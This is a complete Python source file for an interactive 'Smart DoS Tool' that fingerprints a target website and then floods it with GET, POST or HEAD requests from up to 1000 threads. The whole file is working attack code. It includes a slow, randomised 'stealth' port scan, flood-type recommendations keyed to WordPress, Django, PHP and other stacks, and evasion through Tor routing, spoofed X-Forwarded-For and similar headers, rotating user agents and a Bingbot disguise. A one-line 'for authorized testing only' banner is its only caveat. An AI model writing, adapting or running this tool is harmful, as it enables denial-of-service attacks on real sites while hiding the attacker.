#!/usr/bin/env python3
"""
Smart DoS Tool - FOR AUTHORIZED TESTING ONLY
Stealth scanning + intelligent attack recommendations
"""

import threading
import requests
import random
import time
import socket
import struct
from concurrent.futures import ThreadPoolExecutor
import argparse
import sys

# Suppress warnings
import warnings
warnings.filterwarnings("ignore")
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Optional imports
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

class SmartDosTool:
    def __init__(self):
        self.running = True
        self.requests_sent = 0
        self.lock = threading.Lock()
        self.start_time = None
        self.scan_results = {}

    def display_banner(self):
        banner = """
    \033[91m
    ███████╗███████╗ ██████╗ ██████╗ ██╗ █████╗ ████████╗██╗   ██╗
    ██╔════╝██╔════╝██╔═══██╗██╔══██╗██║██╔══██╗╚══██╔══╝╚██╗ ██╔╝
    ███████╗█████╗  ██║   ██║██████╔╝██║███████║   ██║    ╚████╔╝ 
    ╚════██║██╔══╝  ██║   ██║██╔══██╗██║██╔══██║   ██║     ╚██╔╝  
    ███████║██║     ╚██████╔╝██║  ██║██║██║  ██║   ██║      ██║   
    ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   
                                                                
    \033[0m
    \033[96m           SMART DoS TOOL v4.0\033[0m
    \033[93m    STEALTH SCAN + INTELLIGENT ATTACKS\033[0m
    \033[93m         FOR AUTHORIZED TESTING ONLY\033[0m
    """
        print(banner)

    def scan_ports_stealthy(self, target_domain):
        """Stealthy port scanning with random delays and fragmented attempts"""
        print(f"\n\033[94m[STEALTH SCANNING] {target_domain} (this will take 15-30 seconds)...\033[0m")
        
        # Common web service ports that can be DoS'd
        web_ports = [80, 443, 8080, 8443, 8000, 3000, 5000, 9000]
        open_ports = []
        
        def stealth_check_port(port):
            try:
                # Random delay between 1-5 seconds
                time.sleep(random.uniform(1, 5))
                
                # Use TCP SYN scan (half-open) for stealth
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)  # Longer timeout for stealth
                
                # Set socket options for stealth
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                result = sock.connect_ex((target_domain, port))
                sock.close()
                
                if result == 0:
                    service = self.get_service_name(port)
                    open_ports.append((port, service))
                    print(f"\033[92m[OPEN] Port {port} - {service}\033[0m")
                else:
                    # Don't show closed ports for stealth
                    pass
                    
            except:
                # Silent fail for stealth
                pass
        
        # Scan ports with VERY limited threading for stealth
        print("\033[94m[STEALTH] Scanning with slow, random delays...\033[0m")
        
        # Use only 2 threads max for stealth
        with ThreadPoolExecutor(max_workers=2) as executor:
            # Shuffle ports to avoid pattern detection
            shuffled_ports = web_ports.copy()
            random.shuffle(shuffled_ports)
            executor.map(stealth_check_port, shuffled_ports)
        
        if not open_ports:
            print("\033[93m[STEALTH] No open web ports found (or all filtered)\033[0m")
        
        return open_ports

    def get_service_name(self, port):
        """Get service name for port"""
        services = {
            80: 'HTTP',
            443: 'HTTPS',
            8080: 'HTTP-ALT',
            8443: 'HTTPS-ALT',
            8000: 'HTTP-ALT',
            3000: 'Node.js',
            5000: 'Flask/Django',
            9000: 'HTTP-ALT'
        }
        return services.get(port, 'Unknown')

    def analyze_target_stealthy(self, target_url):
        """Stealthy target analysis with minimal footprint"""
        print(f"\n\033[94m[STEALTH ANALYSIS] Target: {target_url}\033[0m")
        
        try:
            # Extract domain for port scanning
            domain = target_url.split('//')[-1].split('/')[0].split(':')[0]
            
            # Use stealth port scanning
            open_ports = self.scan_ports_stealthy(domain)
            
            # Minimal web analysis with stealth headers
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            })
            
            # Add random delay before request
            time.sleep(random.uniform(2, 5))
            
            # Make only ONE request with longer timeout
            response = session.get(target_url, timeout=15, verify=False)
            content_type = response.headers.get('content-type', '').lower()
            server = response.headers.get('server', 'Unknown')
            
            # Quick application detection (minimal analysis)
            app_type = "Generic Web Server"
            response_lower = response.text.lower()
            
            if 'wp-content' in response_lower or 'wordpress' in response_lower:
                app_type = "WordPress"
            elif 'django' in server:
                app_type = "Django"
            elif 'node' in server:
                app_type = "Node.js"
            elif '.php' in response_lower or 'php' in server:
                app_type = "PHP"
            elif 'asp.net' in server or '__viewstate' in response_lower:
                app_type = "ASP.NET"
            
            # Generate recommendation based on minimal data
            recommendation = self.generate_recommendation(open_ports, app_type, content_type)
            
            return {
                'open_ports': open_ports,
                'app_type': app_type,
                'server': server,
                'content_type': content_type,
                'recommendation': recommendation
            }
            
        except Exception as e:
            print(f"\033[93m[STEALTH SCAN ERROR] Scan failed quietly\033[0m")
            # Return minimal default recommendation
            return {
                'open_ports': [],
                'app_type': 'Unknown',
                'server': 'Unknown',
                'content_type': 'Unknown',
                'recommendation': {'attack_type': '4', 'reason': 'Mixed Attack - Stealth mode default'}
            }

    def generate_recommendation(self, open_ports, app_type, content_type):
        """Generate intelligent attack recommendation"""
        has_http = any(port in [80, 8080, 8000, 9000] for port, _ in open_ports)
        has_https = any(port in [443, 8443] for port, _ in open_ports)
        
        # Base recommendation on application type and ports
        if app_type == "WordPress":
            return {'attack_type': '2', 'reason': 'POST Flood - WordPress has many form endpoints'}
        elif app_type == "Django":
            return {'attack_type': '2', 'reason': 'POST Flood - Django applications often have heavy form processing'}
        elif app_type == "Node.js":
            return {'attack_type': '1', 'reason': 'GET Flood - Node.js servers handle concurrent connections well'}
        elif app_type == "PHP":
            return {'attack_type': '4', 'reason': 'Mixed Attack - PHP applications vary widely in architecture'}
        elif app_type == "ASP.NET":
            return {'attack_type': '3', 'reason': 'HEAD Flood - ASP.NET has efficient HEAD request handling'}
        elif app_type == "Java":
            return {'attack_type': '4', 'reason': 'Mixed Attack - Java apps have robust threading, mix it up'}
        else:
            # Default based on ports
            if has_https and not has_http:
                return {'attack_type': '3', 'reason': 'HEAD Flood - HTTPS-only sites handle HEAD requests efficiently'}
            else:
                return {'attack_type': '1', 'reason': 'GET Flood - Standard web servers handle GET requests optimally'}

    def generate_spoofed_ip(self):
        """Generate random IP address for spoofing"""
        return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

    def get_tor_ip(self):
        """Get current Tor exit node IP"""
        try:
            session = requests.Session()
            session.proxies = {
                'http': 'socks5://127.0.0.1:9050',
                'https': 'socks5://127.0.0.1:9050'
            }
            response = session.get('https://check.torproject.org/api/ip', timeout=10)
            return response.json().get('IP', 'Unknown Tor IP')
        except:
            return "Tor IP Check Failed"

    def create_session_with_spoofed_headers(self, use_tor=False, spoof_ip=False):
        """Create session with spoofed headers and optional Tor"""
        session = requests.Session()
        
        if use_tor and SOCKS_AVAILABLE:
            session.proxies = {
                'http': 'socks5://127.0.0.1:9050',
                'https': 'socks5://127.0.0.1:9050'
            }
        
        # Random user agents
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15'
        ]
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        spoofed_ip = None
        # Add spoofed headers if requested
        if spoof_ip:
            spoofed_ip = self.generate_spoofed_ip()
            headers.update({
                'X-Forwarded-For': spoofed_ip,
                'X-Real-IP': spoofed_ip,
                'X-Originating-IP': spoofed_ip,
                'X-Remote-IP': spoofed_ip,
                'X-Client-IP': spoofed_ip,
                'X-Host': spoofed_ip,
                'X-Forwarded-Host': spoofed_ip,
            })
        
        session.headers.update(headers)
        return session, spoofed_ip

    def send_request(self, target, request_id, use_tor, spoof_ip, delay, attack_type, thread_id):
        """Send HTTP request with specified parameters"""
        if not self.running:
            return
        
        try:
            session, current_spoofed_ip = self.create_session_with_spoofed_headers(use_tor, spoof_ip)
            
            # Apply delay if specified
            if delay > 0:
                time.sleep(delay)
            
            # Get source IP info
            if use_tor:
                source_ip = self.get_tor_ip()
                ip_type = "Tor IP"
            elif spoof_ip and current_spoofed_ip:
                source_ip = current_spoofed_ip
                ip_type = "Spoofed IP"
            else:
                source_ip = "Real IP"
                ip_type = "Real IP"
            
            # Send request based on attack type
            if attack_type == "1":  # GET Flood
                response = session.get(target, timeout=5, verify=False)
                status = response.status_code
            elif attack_type == "2":  # POST Flood
                post_data = {
                    'username': f'user{random.randint(1000,9999)}',
                    'password': f'pass{random.randint(1000,9999)}',
                    'email': f'test{random.randint(1000,9999)}@test.com'
                }
                response = session.post(target, data=post_data, timeout=5, verify=False)
                status = response.status_code
            elif attack_type == "3":  # HEAD Flood
                response = session.head(target, timeout=5, verify=False)
                status = response.status_code
            else:  # Mixed attack
                methods = [session.get, session.post, session.head]
                response = random.choice(methods)(target, timeout=5, verify=False)
                status = response.status_code
            
            with self.lock:
                self.requests_sent += 1
                current_count = self.requests_sent
            
            print(f"[Thread-{thread_id}] Request #{current_count} - Status: {status} - From: {source_ip} ({ip_type})")
            
        except requests.exceptions.RequestException as e:
            with self.lock:
                self.requests_sent += 1
                current_count = self.requests_sent
            
            # Get source IP info for error message
            if use_tor:
                source_ip = "Tor Network"
                ip_type = "Tor"
            elif spoof_ip:
                source_ip = current_spoofed_ip if 'current_spoofed_ip' in locals() else "Spoofed IP"
                ip_type = "Spoofed"
            else:
                source_ip = "Real IP"
                ip_type = "Real"
            
            print(f"[Thread-{thread_id}] Request #{current_count} - Failed: {str(e)[:50]} - From: {source_ip} ({ip_type})")

    def calculate_requests_per_second(self):
        """Calculate and display requests per second"""
        if self.start_time:
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                rps = self.requests_sent / elapsed
                return rps
        return 0

    def status_monitor(self):
        """Monitor and display attack status"""
        while self.running:
            time.sleep(5)
            rps = self.calculate_requests_per_second()
            print(f"\n[STATUS] Total Requests: {self.requests_sent} | RPS: {rps:.2f} | Running: {threading.active_count()-2} threads\n")

    def start_attack(self, target, num_threads, use_tor, spoof_ip, delay, attack_type, duration=None):
        """Start the DoS attack"""
        print(f"\n\033[94m[ATTACK STARTING]\033[0m")
        print(f"\033[94m  Target: {target}\033[0m")
        print(f"\033[94m  Threads: {num_threads}\033[0m")
        print(f"\033[94m  Tor: {'ENABLED' if use_tor else 'DISABLED'}\033[0m")
        print(f"\033[94m  IP Spoofing: {'ENABLED' if spoof_ip else 'DISABLED'}\033[0m")
        print(f"\033[94m  Delay: {delay}s between requests\033[0m")
        print(f"\033[94m  Attack Type: {['GET Flood', 'POST Flood', 'HEAD Flood', 'Mixed Attack'][int(attack_type)-1]}\033[0m")
        if duration:
            print(f"\033[94m  Duration: {duration} seconds\033[0m")
        print(f"\033[94m  Mode: MAXIMUM SPEED\033[0m")
        
        # Show what to expect
        if use_tor:
            print(f"\033[94m  IP Display: Will show actual Tor exit node IPs\033[0m")
        elif spoof_ip:
            print(f"\033[94m  IP Display: Will show random spoofed IP addresses\033[0m")
        else:
            print(f"\033[94m  IP Display: Will show 'Real IP' (your actual IP)\033[0m")
            
        print(f"\033[94m  Starting in 3 seconds...\033[0m")
        time.sleep(3)
        
        self.start_time = time.time()
        self.requests_sent = 0
        
        # Start status monitor
        monitor_thread = threading.Thread(target=self.status_monitor, daemon=True)
        monitor_thread.start()
        
        # Start attack threads
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            request_id = 0
            try:
                while self.running:
                    if duration and (time.time() - self.start_time) > duration:
                        print(f"\n[INFO] Attack duration reached ({duration}s)")
                        break
                    
                    # Submit multiple requests per iteration for maximum speed
                    for _ in range(min(10, num_threads)):  # Batch submissions
                        request_id += 1
                        executor.submit(
                            self.send_request,
                            target, request_id, use_tor, spoof_ip, delay, attack_type, threading.get_ident() % 1000
                        )
                    
                    # Small sleep to prevent overwhelming the executor
                    time.sleep(0.01)
                    
            except KeyboardInterrupt:
                print(f"\n[INFO] Attack interrupted by user")
            except Exception as e:
                print(f"\n[ERROR] Attack error: {e}")
        
        self.running = False
        self.display_results()

    def display_results(self):
        """Display final attack results"""
        total_time = time.time() - self.start_time if self.start_time else 0
        rps = self.calculate_requests_per_second()
        
        print(f"\n\033[92m{'='*60}\033[0m")
        print(f"\033[92m[ATTACK COMPLETED]\033[0m")
        print(f"\033[92m  Total Requests: {self.requests_sent}\033[0m")
        print(f"\033[92m  Total Time: {total_time:.2f} seconds\033[0m")
        print(f"\033[92m  Average RPS: {rps:.2f}\033[0m")
        print(f"\033[92m  Peak Threads: {threading.active_count()-1}\033[0m")
        print(f"\033[92m{'='*60}\033[0m")

    def get_user_input(self):
        """Get all configuration from user"""
        self.display_banner()
        
        print("\n\033[96m[TARGET CONFIGURATION]\033[0m")
        
        # Target
        target = input("\n\033[96m[?] Enter target URL: \033[0m").strip()
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        # AUTO-SCAN TARGET WITH STEALTH MODE
        print(f"\n\033[94m[INITIALIZING STEALTH SCAN]\033[0m")
        scan_results = self.analyze_target_stealthy(target)
        
        # Display scan results
        print(f"\n\033[94m{'='*60}\033[0m")
        print(f"\033[94m[SCAN RESULTS]\033[0m")
        if scan_results['open_ports']:
            print(f"\033[94m  Open Ports: {len(scan_results['open_ports'])}\033[0m")
            for port, service in scan_results['open_ports']:
                print(f"\033[94m    {port}/tcp - {service}\033[0m")
        else:
            print(f"\033[93m  No open web ports found\033[0m")
        print(f"\033[94m  Application: {scan_results['app_type']}\033[0m")
        print(f"\033[94m  Server: {scan_results['server']}\033[0m")
        print(f"\033[94m{'='*60}\033[0m")
        
        # Display intelligent recommendation
        recommendation = scan_results['recommendation']
        print(f"\n\033[92m[INTELLIGENT RECOMMENDATION]\033[0m")
        print(f"\033[92m  Attack: {['GET Flood', 'POST Flood', 'HEAD Flood', 'Mixed Attack'][int(recommendation['attack_type'])-1]}\033[0m")
        print(f"\033[92m  Reason: {recommendation['reason']}\033[0m")
        
        # Attack configuration
        print(f"\n\033[96m[ATTACK CONFIGURATION]\033[0m")
        
        # Use recommended attack or let user choose
        use_recommended = input(f"\033[96m[?] Use recommended attack? (y/n): \033[0m").lower() == 'y'
        if use_recommended:
            attack_type = recommendation['attack_type']
            print(f"\033[92m[SELECTED] {['GET Flood', 'POST Flood', 'HEAD Flood', 'Mixed Attack'][int(attack_type)-1]}\033[0m")
        else:
            print("\n\033[94m[ATTACK TYPE OPTIONS]\033[0m")
            print("\033[95m  [1] GET Flood - Basic requests")
            print("\033[95m  [2] POST Flood - Form submissions") 
            print("\033[95m  [3] HEAD Flood - Header requests")
            print("\033[95m  [4] Mixed Attack - Random methods")
            attack_type = input("\033[96m[?] Select attack type (1-4): \033[0m").strip() or "1"
        
        # IP Spoofing
        spoof_ip = input("\033[96m[?] Use IP spoofing? (y/n): \033[0m").lower() == 'y'
        
        use_tor = False
        if spoof_ip:
            print("\n\033[94m[IP SPOOFING OPTIONS]\033[0m")
            print("\033[95m  Tor routes through one IP (good for anonymity)")
            print("\033[95m  IP spoofing uses fake headers (appears as multiple IPs)")
            print("\033[95m  Tool will SHOW ACTUAL IPs being used!\033[0m")
            spoof_method = input("\033[96m[?] Use (t)or or (i)p spoofing? (t/i): \033[0m").lower()
            use_tor = (spoof_method == 't')
            spoof_ip = (spoof_method == 'i')
        else:
            use_tor = input("\033[96m[?] Use Tor? (y/n): \033[0m").lower() == 'y'
        
        # Threads
        try:
            num_threads = int(input("\033[96m[?] Number of threads (1-1000): \033[0m") or "50")
            num_threads = max(1, min(1000, num_threads))
        except:
            num_threads = 50
            print("\033[93m[INFO] Using default: 50 threads\033[0m")
        
        # Delay for firewall bypass
        try:
            delay = float(input("\033[96m[?] Delay between requests in seconds (0 for max speed, 0.1-5 for stealth): \033[0m") or "0")
            delay = max(0, min(5, delay))
        except:
            delay = 0
            print("\033[93m[INFO] Using max speed (0 delay)\033[0m")
        
        # Duration (optional)
        duration = None
        use_duration = input("\033[96m[?] Set time limit? (y/n): \033[0m").lower() == 'y'
        if use_duration:
            try:
                duration = int(input("\033[96m[?] Duration in seconds: \033[0m"))
            except:
                print("\033[93m[INFO] No duration limit\033[0m")
        
        return target, num_threads, use_tor, spoof_ip, delay, attack_type, duration

    def run(self):
        """Main execution function"""
        try:
            target, num_threads, use_tor, spoof_ip, delay, attack_type, duration = self.get_user_input()
            
            print(f"\n\033[94m{'='*60}\033[0m")
            print(f"\033[94m[FINAL CONFIGURATION]\033[0m")
            print(f"\033[94m  Target: {target}\033[0m")
            print(f"\033[94m  Threads: {num_threads}\033[0m")
            print(f"\033[94m  Tor: {'ENABLED' if use_tor else 'DISABLED'}\033[0m")
            print(f"\033[94m  IP Spoofing: {'ENABLED' if spoof_ip else 'DISABLED'}\033[0m")
            print(f"\033[94m  Delay: {delay}s\033[0m")
            print(f"\033[94m  Attack: {['GET Flood', 'POST Flood', 'HEAD Flood', 'Mixed Attack'][int(attack_type)-1]}\033[0m")
            if duration:
                print(f"\033[94m  Duration: {duration}s\033[0m")
            
            # Show what IPs will be displayed
            if use_tor:
                print(f"\033[94m  IP Display: Will show ACTUAL Tor exit node IPs\033[0m")
            elif spoof_ip:
                print(f"\033[94m  IP Display: Will show RANDOM spoofed IP addresses\033[0m")
            else:
                print(f"\033[94m  IP Display: Will show 'Real IP' (your actual IP)\033[0m")
                
            print(f"\033[94m{'='*60}\033[0m")
            
            confirm = input("\n\033[96m[?] Start attack? (y/n): \033[0m").lower()
            if confirm != 'y':
                print("\033[93m[INFO] Attack cancelled\033[0m")
                return
            
            self.start_attack(target, num_threads, use_tor, spoof_ip, delay, attack_type, duration)
            
        except KeyboardInterrupt:
            print(f"\n\033[93m[INFO] Tool interrupted\033[0m")
        except Exception as e:
            print(f"\n\033[91m[ERROR] {e}\033[0m")

def main():
    tool = SmartDosTool()
    tool.run()

if __name__ == "__main__":
    main()
